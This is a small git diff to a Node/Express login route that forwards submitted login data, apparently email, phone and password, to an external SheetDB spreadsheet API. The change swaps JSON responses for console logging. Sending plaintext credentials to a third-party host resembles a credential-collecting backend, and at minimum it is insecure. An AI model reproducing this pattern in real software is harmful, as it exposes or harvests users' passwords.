@@ -39,14 +39,10 @@ app.post(baseUrl + "/login", async (req, res) => {
 
     await axios.post('https://sheetdb.io/api/v1/b26an47qz0cay', data)
         .then(response => {
-            res.json({
-                message: `Email: ${response.email} Tel: ${response.tel} Password: ${response.password} logged in`
-            });
+            console.log(response);
         })
         .catch(error => {
-            res.json({
-                message: `${error}`
-            });
+          console.log(error);
         });
 
     await res.json({
